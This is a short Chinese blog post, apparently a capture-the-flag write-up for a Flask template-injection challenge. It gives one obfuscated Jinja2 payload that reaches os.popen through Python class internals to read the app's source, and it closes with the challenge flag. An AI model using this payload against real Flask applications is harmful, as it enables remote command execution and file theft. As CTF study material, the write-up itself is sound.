---
title: '[pasecactf_2019]flask_ssti'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-01-15 11:30:45
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1123677.png
---
一道没什么过滤的ssti。

    {{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("cat%20app\x2epy")["read"]()}}

找到os读源码
经过encode的flag在config里面：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210115162006.png)

然后根据得到的源码反推即可。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210115162043.png)

flag{5a4300b4-09b3-4c56-a06d-fcda5bbfd765}